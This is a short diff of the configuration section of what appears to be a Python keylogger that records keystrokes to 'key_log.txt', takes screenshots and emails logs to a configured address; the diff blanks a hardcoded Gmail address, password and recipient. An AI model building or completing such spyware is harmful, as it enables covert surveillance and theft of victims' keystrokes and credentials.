@@ -28,12 +28,12 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 keys_information = "key_log.txt"
-email_address = "randomemailentry01@gmail.com"
-password = " simplePass"
+email_address = ""
+password = " "
 
 username = getpass.getuser()
 
-toaddr = "randomemailentry01@gmail.com"
+toaddr = ""
 
 file_path = 'C:\\Users\\Christian Yehle\\Documents\\Logger'
 extend = "\\"
